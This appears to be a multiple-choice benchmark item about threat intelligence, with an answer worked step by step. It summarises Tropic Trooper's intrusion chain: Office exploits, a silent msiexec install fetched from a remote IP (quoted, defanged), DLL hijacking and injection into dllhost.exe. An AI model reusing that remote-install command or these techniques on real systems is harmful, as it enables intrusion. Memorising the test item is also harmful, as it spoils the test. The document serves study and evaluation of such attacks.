### Step-by-Step Analysis

#### 1. Analyze the CTI Report

**Initial Access:**
- Tropic Trooper used exploits for CVE-2017-11882 or CVE-2018-0802 to execute commands.
- They downloaded and installed an installer package (.msi) using the command: `/c msiexec /q /i [hxxp://61[.]216[.]5[.]24/in.sys]`.

**Execution:**
- The system configuration file (in.sys) dropped a backdoor installer (UserInstall.exe) and then deleted itself.
- UserInstall.exe dropped:
  - A normal sidebar.exe file (a Windows Gadget tool).
  - A malicious loader (in "C:\ProgramData\Apple\Update\wab32res.dll").
  - An encrypted configuration file.
- UserInstall.exe used BITSadmin to create a job and launch sidebar.exe.
- The malicious loader used DLL hijacking on sidebar.exe and launched dllhost.exe.
- The loader injected a DLL backdoor into dllhost.exe.

**Persistence:**
- The backdoor decrypts the configuration file and uses SSL to connect to C&C servers.

**Command and Control:**
- TClient, a backdoor, uses custom SSL libraries to connect to the C&C server.
- The C&C server and configuration values are not hardcoded, allowing for easy updates.

**Others:**
- Tropic Trooper uses exploit-laden Microsoft Office documents to deliver malware.
- The MSI file drops three files and creates a hidden directory (UFile) in C:\ProgramData\Apple\Update\.
- The malicious wab32res.dll is loaded by the benign sidebar.exe to evade AV detection.

#### 2. Analyze the Question

**Question:**
- After using Equation Editor exploits to execute an installer package with malicious payloads, is Tropic Trooper likely to execute the FakeRun loader to launch dllhost.exe before injecting a malicious DLL backdoor into the same process to facilitate their attack?

**Answer Choices:**
- A: Yes
- B: No

#### 3. Compare and Evaluate

**Extracted Attack Sequence:**
1. **Initial Access:**
   - Exploit CVE-2017-11882 or CVE-2018-0802.
   - Download and install an installer package (.msi).

2. **Execution:**
   - Drop and execute UserInstall.exe.
   - UserInstall.exe drops:
     - sidebar.exe.
     - wab32res.dll (malicious loader).
     - Encrypted configuration file.
   - Use BITSadmin to launch sidebar.exe.
   - The malicious loader (wab32res.dll) uses DLL hijacking on sidebar.exe.
   - The loader launches dllhost.exe.
   - The loader injects a DLL backdoor into dllhost.exe.

**Evaluation of Answer Choices:**
- **A: Yes**
  - The question asks if Tropic Trooper is likely to execute the FakeRun loader to launch dllhost.exe before injecting a malicious DLL backdoor.
  - The CTI report does not mention a "FakeRun" loader. Instead, it describes the use of a malicious loader (wab32res.dll) that hijacks sidebar.exe and launches dllhost.exe.
  - The sequence in the report does not include a "FakeRun" loader.

- **B: No**
  - The CTI report clearly describes the use of a malicious loader (wab32res.dll) that hijacks sidebar.exe and launches dllhost.exe.
  - There is no mention of a "FakeRun" loader in the report.

#### 4. Provide a Step-by-Step Reasoning and Final Answer

**Reasoning:**
- The CTI report provides a detailed sequence of the attack, including the use of a malicious loader (wab32res.dll) to hijack sidebar.exe and launch dllhost.exe.
- The report does not mention a "FakeRun" loader.
- Therefore, the sequence described in the question, which includes a "FakeRun" loader, does not align with the attack sequence described in the CTI report.

**Final Answer: B: No**
